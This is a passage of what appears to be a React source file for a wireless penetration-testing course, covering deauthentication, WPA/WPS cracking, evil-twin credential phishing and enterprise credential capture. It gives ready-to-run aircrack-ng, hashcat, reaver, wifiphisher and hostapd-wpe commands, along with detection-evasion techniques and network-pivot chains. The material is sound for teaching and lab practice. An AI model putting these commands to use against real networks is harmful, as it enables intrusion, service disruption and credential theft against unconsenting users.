â”‚  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤    â”‚
â”‚  â”‚                                                                      â”‚    â”‚
â”‚  â”‚  Reason Code (2 bytes):                                              â”‚    â”‚
â”‚  â”‚  â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•                                             â”‚    â”‚
â”‚  â”‚  1  = Unspecified reason                                             â”‚    â”‚
â”‚  â”‚  2  = Previous authentication no longer valid                        â”‚    â”‚
â”‚  â”‚  3  = Station is leaving (deauthenticated)                          â”‚    â”‚
â”‚  â”‚  4  = Disassociated due to inactivity                               â”‚    â”‚
â”‚  â”‚  6  = Class 2 frame from non-authenticated station                  â”‚    â”‚
â”‚  â”‚  7  = Class 3 frame from non-associated station â˜… (most common)     â”‚    â”‚
â”‚  â”‚  8  = Disassociated because station leaving BSS                     â”‚    â”‚
â”‚  â”‚                                                                      â”‚    â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜    â”‚
â”‚                                                                               â”‚
â”‚  WHY DEAUTH ATTACKS WORK:                                                     â”‚
â”‚  â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•                                                    â”‚
â”‚                                                                               â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”      â”‚
â”‚  â”‚  MANAGEMENT FRAMES ARE NOT AUTHENTICATED OR ENCRYPTED!             â”‚      â”‚
â”‚  â”‚                                                                     â”‚      â”‚
â”‚  â”‚  â€¢ Any device can forge deauth frames with spoofed source address  â”‚      â”‚
â”‚  â”‚  â€¢ Client trusts frame appears to come from AP                     â”‚      â”‚
â”‚  â”‚  â€¢ AP trusts frame appears to come from client                     â”‚      â”‚
â”‚  â”‚  â€¢ No way to verify authenticity without 802.11w (PMF)            â”‚      â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜      â”‚
â”‚                                                                               â”‚
â”‚  ATTACK VARIANTS:                                                             â”‚
â”‚  â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•                                                             â”‚
â”‚                                                                               â”‚
â”‚  1. TARGETED DEAUTH                                                           â”‚
â”‚     â€¢ Kick specific client to capture handshake on reconnect                 â”‚
â”‚     â€¢ aireplay-ng -0 5 -a <BSSID> -c <CLIENT_MAC> wlan0mon                  â”‚
â”‚                                                                               â”‚
â”‚  2. BROADCAST DEAUTH                                                          â”‚
â”‚     â€¢ Kick ALL clients (DoS or mass handshake capture)                       â”‚
â”‚     â€¢ aireplay-ng -0 0 -a <BSSID> wlan0mon  (continuous)                    â”‚
â”‚                                                                               â”‚
â”‚  3. CHANNEL SWEEP                                                             â”‚
â”‚     â€¢ Deauth all networks on all channels                                    â”‚
â”‚     â€¢ mdk4 wlan0mon d -c 1,6,11                                              â”‚
â”‚                                                                               â”‚
â”‚  DEFENSE (802.11w / PMF):                                                     â”‚
â”‚  â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•                                                     â”‚
â”‚  â€¢ Management Frame Protection encrypts/signs management frames              â”‚
â”‚  â€¢ Required for WPA3, optional on WPA2                                       â”‚
â”‚  â€¢ Clients must support PMF for protection to work                           â”‚
â”‚  â€¢ Set "PMF Required" on AP to enforce                                       â”‚
â”‚                                                                               â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜`,
  },
};

// Attack timelines for step-by-step understanding
const attackTimelines = [
  {
    name: "Complete WPA2 PSK Attack",
    description: "Full attack from reconnaissance to cracked password",
    totalTime: "5 minutes to days (depends on password)",
    steps: [
      { time: "0:00", action: "Enable monitor mode", command: "airmon-ng start wlan0", notes: "Check for interfering processes" },
      { time: "0:30", action: "Scan for targets", command: "airodump-ng wlan0mon", notes: "Identify target BSSID, channel, clients" },
      { time: "1:00", action: "Focus on target", command: "airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon", notes: "Lock to channel, start capture" },
      { time: "1:30", action: "Deauth client", command: "aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon", notes: "Force handshake capture" },
      { time: "2:00", action: "Verify handshake", command: "aircrack-ng capture-01.cap", notes: "Should show 'WPA (1 handshake)'" },
      { time: "2:30", action: "Convert for hashcat", command: "hcxpcapngtool -o hash.22000 capture-01.cap", notes: "Modern format includes PMKID if available" },
      { time: "3:00", action: "Dictionary attack", command: "hashcat -m 22000 hash.22000 rockyou.txt", notes: "Fast if password in wordlist" },
      { time: "3:30+", action: "Rule-based attack", command: "hashcat -m 22000 hash.22000 wordlist.txt -r best64.rule", notes: "Try variations of common passwords" },
      { time: "?", action: "Bruteforce (last resort)", command: "hashcat -m 22000 hash.22000 -a 3 ?l?l?l?l?l?l?l?l", notes: "8 lowercase = 24 hours on RTX 4090" },
    ],
  },
  {
    name: "WPS Pixie Dust Attack",
    description: "Instant WPS PIN recovery via weak random numbers",
    totalTime: "Under 1 minute if vulnerable",
    steps: [
      { time: "0:00", action: "Enable monitor mode", command: "airmon-ng start wlan0", notes: "" },
      { time: "0:15", action: "Find WPS-enabled targets", command: "wash -i wlan0mon", notes: "Look for 'Lck' column = No" },
      { time: "0:30", action: "Attempt Pixie Dust", command: "reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K 1 -vv", notes: "-K 1 = PixieWPS" },
      { time: "0:45", action: "Success?", command: "(check output)", notes: "PIN and WPA PSK displayed if vulnerable" },
      { time: "0:50", action: "Alternative: bully", command: "bully -b AA:BB:CC:DD:EE:FF -d -v 3 wlan0mon", notes: "Different implementation, may work when reaver doesn't" },
    ],
  },
  {
    name: "Evil Twin with Captive Portal",
    description: "Credential phishing via fake access point",
    totalTime: "Setup: 5 min, Attack: depends on targets",
    steps: [
      { time: "0:00", action: "Identify target network", command: "airodump-ng wlan0mon", notes: "Get SSID, BSSID, channel" },
      { time: "1:00", action: "Start wifiphisher", command: "wifiphisher -aI wlan1 -jI wlan0 -p oauth-login", notes: "Needs 2 wireless interfaces" },
      { time: "2:00", action: "Select target", command: "(interactive)", notes: "Choose network to clone" },
      { time: "3:00", action: "Automatic deauth", command: "(automatic)", notes: "Wifiphisher kicks clients" },
      { time: "3:30", action: "Victim connects", command: "(wait)", notes: "Victim sees familiar SSID" },
      { time: "4:00", action: "Serve captive portal", command: "(automatic)", notes: "Fake login page shown" },
      { time: "?", action: "Credential captured", command: "(wait)", notes: "User enters WiFi password" },
    ],
  },
  {
    name: "Enterprise Credential Harvest",
    description: "Capture WPA2-Enterprise credentials via hostapd-wpe",
    totalTime: "Setup: 10 min, Attack: depends on targets",
    steps: [
      { time: "0:00", action: "Install hostapd-wpe", command: "apt install hostapd-wpe", notes: "Kali has it pre-installed" },
      { time: "2:00", action: "Configure evil twin", command: "nano /etc/hostapd-wpe/hostapd-wpe.conf", notes: "Set SSID to match target" },
      { time: "5:00", action: "Generate certificates", command: "cd /etc/hostapd-wpe/certs && ./bootstrap", notes: "Create fake RADIUS cert" },
      { time: "7:00", action: "Start evil twin", command: "hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf", notes: "Rogue AP + RADIUS running" },
      { time: "8:00", action: "Optional: Deauth", command: "aireplay-ng -0 5 -a <LEGIT_BSSID> wlan1mon", notes: "Force clients to reconnect" },
      { time: "?", action: "Client connects", command: "(wait)", notes: "User device auto-connects" },
      { time: "?", action: "Credential captured", command: "tail -f hostapd-wpe.log", notes: "Challenge:Response logged" },
      { time: "+1m", action: "Crack hash", command: "asleap -C <challenge> -R <response> -W wordlist.txt", notes: "Or hashcat -m 5500" },
    ],
  },
];

const attackTypes = [
  {
    category: "Reconnaissance",
    icon: <RadarIcon />,
    description: "The first phase of any wireless assessment - discovering and mapping target networks.",
    attacks: [
      { name: "Passive Scanning", description: "Listen for beacon frames and probe requests without transmitting", difficulty: "Easy", detectability: "Undetectable" },
      { name: "Active Scanning", description: "Send probe requests to discover hidden networks", difficulty: "Easy", detectability: "Low" },
      { name: "War Driving", description: "Map wireless networks while moving through an area with GPS logging", difficulty: "Easy", detectability: "Undetectable" },
      { name: "War Walking", description: "On-foot wireless network discovery for building surveys", difficulty: "Easy", detectability: "Undetectable" },
      { name: "Drone Recon", description: "Aerial wireless reconnaissance for large facilities", difficulty: "Medium", detectability: "Undetectable" },
    ],
  },
  {
    category: "Cracking Attacks",
    icon: <LockOpenIcon />,
    description: "Attacks focused on recovering wireless network keys and passwords.",
    attacks: [
      { name: "WEP IV Attack", description: "Collect IVs to crack WEP key - guaranteed success with enough packets", difficulty: "Easy", detectability: "Low" },
      { name: "WPA/WPA2 Dictionary", description: "Capture handshake then crack offline against wordlist", difficulty: "Medium", detectability: "Low" },
      { name: "PMKID Attack", description: "Extract PMKID from AP without needing a client - single packet!", difficulty: "Easy", detectability: "Very Low" },
      { name: "WPS PIN Bruteforce", description: "Exploit weak WPS implementation - only 11,000 PINs possible", difficulty: "Easy", detectability: "Medium" },
      { name: "Pixie Dust", description: "Instant WPS crack exploiting weak random number generation", difficulty: "Easy", detectability: "Low" },
      { name: "Rainbow Tables", description: "Precomputed hash tables for top 1000 SSIDs", difficulty: "Easy", detectability: "None" },
      { name: "GPU Cracking", description: "Hashcat with RTX 4090 can test 2.5M+ WPA passwords/sec", difficulty: "Medium", detectability: "None" },
    ],
  },
  {
    category: "Man-in-the-Middle",
    icon: <DevicesIcon />,
    description: "Position yourself between clients and legitimate access points to intercept traffic.",
    attacks: [
      { name: "Evil Twin", description: "Clone target AP's SSID/BSSID to intercept connections", difficulty: "Medium", detectability: "Medium" },
      { name: "Karma Attack", description: "Respond to ALL probe requests - catch any device looking for known networks", difficulty: "Easy", detectability: "High" },
      { name: "MANA Attack", description: "Enhanced Karma with loud mode for maximum client capture", difficulty: "Easy", detectability: "High" },
      { name: "HTTPS Stripping", description: "Downgrade secure connections to HTTP for credential capture", difficulty: "Medium", detectability: "Low" },
      { name: "Captive Portal", description: "Fake login pages mimicking corporate portals or social sites", difficulty: "Medium", detectability: "Medium" },
      { name: "DNS Hijacking", description: "Redirect DNS queries to malicious servers", difficulty: "Medium", detectability: "Medium" },
    ],
  },
  {
    category: "Denial of Service",
    icon: <WarningIcon />,
    description: "Disrupt wireless network availability - often used to force client reconnections.",
    attacks: [
      { name: "Deauthentication Flood", description: "Forge deauth frames to disconnect all clients", difficulty: "Easy", detectability: "High" },
      { name: "Disassociation Attack", description: "Break client-AP association without full deauth", difficulty: "Easy", detectability: "High" },
      { name: "Beacon Flood", description: "Create thousands of fake networks to overwhelm clients", difficulty: "Easy", detectability: "High" },
      { name: "Authentication Flood", description: "Exhaust AP's authentication table capacity", difficulty: "Easy", detectability: "High" },
      { name: "CTS Flood", description: "Abuse Clear-to-Send frames to silence the channel", difficulty: "Medium", detectability: "Medium" },
      { name: "RTS Flood", description: "Abuse Request-to-Send to reserve channel continuously", difficulty: "Medium", detectability: "Medium" },
    ],
  },
  {
    category: "Client Attacks",
    icon: <PhoneAndroidIcon />,
    description: "Target individual client devices rather than access points.",
    attacks: [
      { name: "Probe Request Tracking", description: "Identify and track devices by their probe requests", difficulty: "Easy", detectability: "Undetectable" },
      { name: "Rogue AP Association", description: "Lure clients to connect to your malicious access point", difficulty: "Medium", detectability: "Medium" },
      { name: "Hotspot Honeypot", description: "Free WiFi trap in public spaces for credential theft", difficulty: "Easy", detectability: "Low" },
      { name: "MAC Spoofing", description: "Impersonate authorized client to bypass MAC filtering", difficulty: "Easy", detectability: "Low" },
      { name: "WiFi Direct Attacks", description: "Exploit peer-to-peer WiFi connections on devices", difficulty: "Medium", detectability: "Low" },
      { name: "Probe Response Injection", description: "Send fake probe responses to manipulate client behavior", difficulty: "Medium", detectability: "Low" },
    ],
  },
];

// Part 3: Tool Mastery Guides with comprehensive details
const toolMasteryGuides = [
  {
    tool: "Aircrack-ng Suite",
    category: "Core Framework",
    description: "The most essential wireless auditing toolkit - every pentester must master this",
    difficulty: "Intermediate",
    components: [
      { name: "airmon-ng", purpose: "Enable/disable monitor mode", examples: ["airmon-ng start wlan0", "airmon-ng check kill", "airmon-ng stop wlan0mon"] },
      { name: "airodump-ng", purpose: "Capture wireless frames and display networks", examples: ["airodump-ng wlan0mon", "airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon", "airodump-ng --wps wlan0mon"] },
      { name: "aireplay-ng", purpose: "Inject packets for various attacks", examples: ["aireplay-ng -0 5 -a BSSID wlan0mon (deauth)", "aireplay-ng -3 -b BSSID wlan0mon (ARP replay)", "aireplay-ng -1 0 -a BSSID wlan0mon (fake auth)"] },
      { name: "aircrack-ng", purpose: "Crack WEP/WPA keys", examples: ["aircrack-ng -w wordlist.txt capture.cap", "aircrack-ng -0 -e SSID capture.cap", "aircrack-ng -J hashfile capture.cap"] },
      { name: "airdecap-ng", purpose: "Decrypt captured packets", examples: ["airdecap-ng -w WEPKEY capture.cap", "airdecap-ng -p password -e SSID capture.cap"] },
      { name: "airolib-ng", purpose: "Manage precomputed PMK database", examples: ["airolib-ng db --import essid ssid.txt", "airolib-ng db --import passwd passwords.txt", "airolib-ng db --batch"] },
    ],
    commonMistakes: [
      "Forgetting to kill interfering processes (airmon-ng check kill)",
      "Not locking to target channel (packets captured on wrong channel)",
      "Running deauth too aggressively (detected by WIDS)",
      "Using wrong wordlist encoding (UTF-8 vs ASCII)",
      "Capturing without specifying output file",
    ],
    proTips: [
      "Always start with 'airmon-ng check kill' to stop NetworkManager",
      "Use '-w' with airodump-ng to auto-save captures periodically",
      "Combine multiple CAP files: aircrack-ng *.cap",
      "For WEP: fake auth first if no clients connected",
      "Check driver support: airmon-ng returns chipset info",
    ],
  },
  {
    tool: "Hashcat for WiFi",
    category: "Password Cracking",
    description: "GPU-accelerated password cracking - essential for WPA/WPA2 assessments",
    difficulty: "Intermediate",
    components: [
      { name: "Mode 22000", purpose: "WPA-PBKDF2-PMKID+EAPOL (modern unified mode)", examples: ["hashcat -m 22000 hash.22000 wordlist.txt", "hashcat -m 22000 hash.22000 -a 3 ?l?l?l?l?l?l?l?l", "hashcat -m 22000 hash.22000 wordlist.txt -r best64.rule"] },
      { name: "Mode 22001", purpose: "WPA-PMK (when you have PMK)", examples: ["hashcat -m 22001 pmk.hash wordlist.txt"] },
      { name: "Mode 5500", purpose: "NetNTLMv1 (WPA-Enterprise captures)", examples: ["hashcat -m 5500 enterprise.hash wordlist.txt"] },
    ],
    commonMistakes: [
      "Using wrong hash mode (check with hashcat --help | grep -i wpa)",
      "Not converting capture correctly (hcxpcapngtool syntax)",
      "Insufficient GPU cooling causing thermal throttling",
      "Running out of VRAM on large wordlists",
      "Forgetting to enable -O (optimized kernels) for speed",
    ],
    proTips: [
      "Convert captures with: hcxpcapngtool -o hash.22000 capture.pcapng",
      "Use rules: -r /usr/share/hashcat/rules/best64.rule",
      "Check speed: hashcat -b -m 22000",
      "Resume sessions: hashcat --restore",
      "Multiple GPUs: --opencl-device-types 1 --force",
      "Benchmark: RTX 4090 = ~2.5M WPA2 hashes/sec",
    ],
  },
  {
    tool: "hcxdumptool + hcxpcapngtool",
    category: "Modern Capture",
    description: "The modern replacement for aircrack-ng's capture tools - more efficient and reliable",
    difficulty: "Beginner-Intermediate",
    components: [
      { name: "hcxdumptool", purpose: "Capture PMKID and EAPOL", examples: ["hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1", "hcxdumptool -i wlan0mon -o capture.pcapng -c 6 --filterlist=filter.txt --filtermode=2"] },
      { name: "hcxpcapngtool", purpose: "Convert captures to hash format", examples: ["hcxpcapngtool -o hash.22000 capture.pcapng", "hcxpcapngtool --essid-list=essids.txt capture.pcapng", "hcxpcapngtool -o hash.22000 -E wordlist capture.pcapng"] },
      { name: "hcxhashtool", purpose: "Manipulate hash files", examples: ["hcxhashtool -i hash.22000 --essid-list", "hcxhashtool -i hash.22000 --pmkid-list"] },
    ],
    commonMistakes: [
      "Running without sudo/root",
      "Not stopping NetworkManager first",
      "Insufficient runtime (PMKID needs 30+ seconds per AP)",
      "Targeting 5GHz without appropriate adapter",
    ],
    proTips: [
      "Let it run for at least 2-3 minutes per target network",
      "Status=1 shows live capture statistics",
      "Filter by BSSID for targeted attacks",
      "Can capture PMKID without any clients connected!",
      "Works better than airodump for modern attacks",
    ],
  },
  {
    tool: "Wifiphisher",
    category: "Evil Twin/Phishing",
    description: "Automated WiFi phishing with multiple attack scenarios and custom templates",
    difficulty: "Beginner",
    components: [
      { name: "Basic Attack", purpose: "Clone network and serve captive portal", examples: ["wifiphisher", "wifiphisher -aI wlan0 -jI wlan1 -p firmware-upgrade"] },
      { name: "Scenarios", purpose: "Pre-built phishing templates", examples: ["-p oauth-login (OAuth phishing)", "-p wifi_connect (WPA password capture)", "-p firmware-upgrade (fake update)"] },
    ],
    commonMistakes: [
      "Using single interface (need 2 wireless adapters)",
      "Not having both adapters support monitor mode",
      "Running against same network as connected",
      "Forgetting to note credentials before closing",
    ],
    proTips: [
      "Always use 2 interfaces: one for rogue AP, one for deauth",
      "Customize scenarios in /usr/share/wifiphisher/data/",
      "Create convincing landing pages for target organization",
      "Log all captured credentials to file",
      "Use strong deauth to force clients to your rogue AP",
    ],
  },
  {
    tool: "Reaver/Bully (WPS)",
    category: "WPS Attacks",
    description: "Exploit WPS PIN vulnerability - still effective against many routers",
    difficulty: "Beginner",
    components: [
      { name: "Wash (Scanning)", purpose: "Find WPS-enabled APs", examples: ["wash -i wlan0mon", "wash -i wlan0mon -5 (5GHz)", "wash -i wlan0mon -j (JSON output)"] },
      { name: "Reaver", purpose: "WPS PIN attack", examples: ["reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv", "reaver -i wlan0mon -b BSSID -K 1 (Pixie Dust)", "reaver -i wlan0mon -b BSSID -p PIN (known PIN)"] },
      { name: "Bully", purpose: "Alternative WPS attack", examples: ["bully -b AA:BB:CC:DD:EE:FF -c 6 wlan0mon", "bully -b BSSID -d -v 3 wlan0mon (verbose)"] },
    ],
    commonMistakes: [
      "Attacking locked AP (check wash output for 'Lck')",
      "Not specifying channel (AP hopping slows attack)",
      "Giving up too early (some APs have rate limiting)",
      "Not trying both Reaver and Bully",
    ],
    proTips: [
      "Always try Pixie Dust first (-K 1): instant if vulnerable",
      "If Reaver fails, try Bully (different implementation)",
      "Check for default PINs (some models use predictable PINs)",
      "Use -d flag for delay between attempts to avoid lockout",
      "Success rate: ~30% for Pixie Dust, ~60% for full bruteforce",
    ],
  },
  {
    tool: "Kismet",
    category: "Monitoring/IDS",
    description: "Advanced wireless sniffer, detector, and intrusion detection system",
    difficulty: "Intermediate-Advanced",
    components: [
      { name: "Capture", purpose: "Passive wireless monitoring", examples: ["kismet -c wlan0mon", "kismet -c wlan0:type=linuxwifi,hop=true"] },
      { name: "Web UI", purpose: "Modern browser interface", examples: ["http://localhost:2501", "Default login: kismet/kismet"] },
      { name: "Logging", purpose: "Comprehensive data capture", examples: ["*.kismet (SQLite database)", "*.pcapng (packet capture)", "*.netxml (Airodump compatible)"] },
    ],
    commonMistakes: [
      "Not setting up source correctly (interface naming)",
      "Missing web interface setup",
      "Overlooking the REST API capabilities",
    ],
    proTips: [
      "Use Kismet for long-term monitoring and data collection",
      "Supports multiple sources including SDR and Bluetooth",
      "REST API allows automation and integration",
      "Better visualization than airodump for site surveys",
      "Can detect rogue APs and deauth attacks (WIDS)",
    ],
  },
];

// Detection evasion techniques
const detectionEvasionTechniques = [
  {
    technique: "Slow Deauthentication",
    description: "Space deauth packets over time to avoid WIDS threshold triggers",
    implementation: "aireplay-ng -0 1 ... (single deauth, repeat with delays)",
    effectiveness: "High",
    detectability: "Low",
  },
  {
    technique: "MAC Randomization",
    description: "Change attacker MAC address between operations",
    implementation: "macchanger -r wlan0mon (before each attack phase)",
    effectiveness: "Medium",
    detectability: "Low",
  },
  {
    technique: "Channel Hopping",
    description: "Don't stay on target channel continuously - blend with normal scanning",
    implementation: "Use airodump-ng without -c flag intermittently",
    effectiveness: "Medium",
    detectability: "Low",
  },
  {
    technique: "Power Level Control",
    description: "Reduce transmission power to limit detection range",
    implementation: "iwconfig wlan0mon txpower 5 (5dBm instead of default ~20dBm)",
    effectiveness: "Medium",
    detectability: "Very Low",
  },
  {
    technique: "Passive PMKID Collection",
    description: "Capture PMKID without deauth - just associate requests",
    implementation: "hcxdumptool without aggressive options",
    effectiveness: "High",
    detectability: "Very Low",
  },
  {
    technique: "802.11w Bypass",
    description: "For PMF-protected networks, can't deauth - use evil twin instead",
    implementation: "Clone SSID with stronger signal, wait for clients",
    effectiveness: "Variable",
    detectability: "Medium",
  },
  {
    technique: "Time-Based Operations",
    description: "Attack during low-activity hours to reduce witness/detection",
    implementation: "Schedule attacks for 2-4 AM when fewer clients connected",
    effectiveness: "Medium",
    detectability: "Low",
  },
  {
    technique: "Legitimate-Looking Traffic",
    description: "Mix attack traffic with normal wireless operations",
    implementation: "Have legitimate devices connected while attacking",
    effectiveness: "Low",
    detectability: "Low",
  },
];

// Advanced attack chains with detailed steps
const advancedAttackChains = [
  {
    name: "Complete Network Compromise",
    scenario: "Full wireless penetration from outside to internal network access",
    difficulty: "Advanced",
    timeEstimate: "1-8 hours",
    phases: [
      {
        phase: "Reconnaissance",
        steps: [
          "Set up capture: airmon-ng start wlan0; airodump-ng wlan0mon",
          "Identify targets: Note BSSID, channel, encryption, clients",
          "Check WPS: wash -i wlan0mon (quick wins)",
          "Gather intel: Note client MACs, probe requests, signal strength",
        ],
        tools: ["aircrack-ng", "wash", "kismet"],
        duration: "15-30 minutes",
      },
      {
        phase: "Initial Access Attempts",
        steps: [
          "Try Pixie Dust: reaver -i wlan0mon -b BSSID -K 1 -vv",
          "Capture PMKID: hcxdumptool -i wlan0mon -o cap.pcapng --enable_status=1",
          "Capture handshake: airodump-ng + aireplay-ng deauth",
          "Start cracking: hashcat -m 22000 hash.22000 wordlist.txt",
        ],
        tools: ["reaver", "hcxdumptool", "aireplay-ng", "hashcat"],
        duration: "30 minutes - hours",
      },
      {
        phase: "Alternative: Evil Twin",
        steps: [
          "If PSK cracking fails, try phishing approach",
          "Set up evil twin: wifiphisher -aI wlan1 -jI wlan0 -p wifi_connect",
          "Wait for credentials from users connecting to fake AP",
          "Capture and verify credentials on real network",
        ],
        tools: ["wifiphisher", "hostapd"],
        duration: "15 minutes - hours",
      },
      {
        phase: "Post-Connection",
        steps: [
          "Connect to network with captured credentials",
          "Scan internal network: nmap -sn 192.168.1.0/24",
          "Identify high-value targets: servers, printers, IoT",
          "Check for additional wireless networks (guest, IoT, corp)",
        ],
        tools: ["nmap", "netdiscover", "arp-scan"],
        duration: "30+ minutes",
      },
    ],
  },
  {
    name: "Enterprise Credential Theft",
    scenario: "Capture WPA2-Enterprise credentials via evil twin RADIUS",
    difficulty: "Intermediate",
    timeEstimate: "30 minutes - 2 hours",
    phases: [
      {
        phase: "Target Identification",
        steps: [
          "Identify enterprise network: Look for WPA2-Enterprise in airodump",
          "Note SSID exactly (case-sensitive)",
          "Identify client devices connecting",
          "Research target org for username formats",
        ],
        tools: ["airodump-ng", "OSINT"],
        duration: "15 minutes",
      },
      {
        phase: "Evil Twin Setup",
        steps: [
          "Configure hostapd-wpe: /etc/hostapd-wpe/hostapd-wpe.conf",
          "Set SSID to match target exactly",
          "Generate certificates: cd certs && ./bootstrap",
          "Start rogue AP: hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf",
        ],
        tools: ["hostapd-wpe"],
        duration: "10 minutes",
      },
      {
        phase: "Client Capture",
        steps: [
          "Deauth clients from legitimate AP (optional but speeds up)",
          "Wait for auto-connect to stronger evil twin signal",
          "Watch hostapd-wpe.log for captured credentials",
          "Format: username:challenge:response",
        ],
        tools: ["aireplay-ng", "hostapd-wpe"],
        duration: "Minutes to hours",
      },
      {
        phase: "Credential Cracking",
        steps: [
          "Extract challenge:response from log",
          "Crack with asleap: asleap -C <challenge> -R <response> -W wordlist.txt",
          "Or hashcat: hashcat -m 5500 hash.txt wordlist.txt",
          "Test credentials on VPN, OWA, other services",
        ],
        tools: ["asleap", "hashcat"],
        duration: "Minutes to hours",
      },
    ],
  },
  {
    name: "IoT Network Pivot",
    scenario: "Compromise IoT network to pivot to main network",
    difficulty: "Intermediate",
    timeEstimate: "2-4 hours",
    phases: [
      {
        phase: "IoT Network Discovery",
        steps: [
          "Identify separate IoT SSID (often -IoT, -Guest suffix)",
          "Check for weaker security (WPA-Personal, simple passwords)",
          "Scan for IoT-specific protocols (Zigbee, Z-Wave if equipped)",
        ],
        tools: ["airodump-ng", "SDR tools"],
        duration: "15 minutes",
      },
      {
        phase: "IoT Network Compromise",
        steps: [
          "Attack IoT WiFi (often weaker passwords)",
          "Connect and enumerate: nmap -sV 192.168.x.0/24",
          "Identify IoT devices: cameras, thermostats, hubs",
          "Check for default credentials on device web interfaces",
        ],
        tools: ["aircrack-ng", "nmap"],
        duration: "30-60 minutes",
      },
      {
        phase: "Device Exploitation",
        steps: [
          "Research CVEs for identified devices",
          "Try default credentials on management interfaces",
          "Check for firmware vulnerabilities",
          "Attempt to access device configuration",
        ],
        tools: ["searchsploit", "browser", "curl"],
        duration: "1-2 hours",
      },
      {
        phase: "Network Pivot",
        steps: [
          "Check if IoT network has route to main network",
          "Look for shared services (same RADIUS, same VLAN)",
          "Use compromised IoT device as pivot point",
          "Enumerate main network from IoT foothold",
        ],
        tools: ["nmap", "proxychains"],
        duration: "30+ minutes",
      },
    ],
  },
];

// Comprehensive detailed lab exercises with network diagrams
const comprehensiveLabExercises = [
  {
    id: 1,
    title: "Complete Home Lab Setup",
    category: "Setup",
    difficulty: "Beginner",
    duration: "2-3 hours",
    description: "Build a safe, legal wireless pentesting lab at home for learning and practice",
    prerequisites: ["Basic Linux command line knowledge", "Understanding of WiFi fundamentals"],
    equipment: [
      { item: "Kali Linux VM or installation", required: true },
      { item: "External wireless adapter (Alfa AWUS036ACH or similar)", required: true },
      { item: "Old/spare router for targets", required: true },
      { item: "Faraday cage or RF shielding (optional)", required: false },
    ],
    networkDiagram: `
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                    WIRELESS PENTEST LAB                         â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                 â”‚
â”‚   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”     ISOLATED      â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”‚
â”‚   â”‚  Kali Linux â”‚ â† â† WiFi Lab â†’ â†’ â”‚  Target Router       â”‚    â”‚
â”‚   â”‚   Attacker  â”‚   (Channel 6)     â”‚  (192.168.1.1)      â”‚    â”‚
â”‚   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜    â”‚
â”‚         â”‚                                    â”‚                  â”‚
â”‚         â”‚ USB                                â”‚ LAN              â”‚
â”‚         â†“                                    â†“                  â”‚
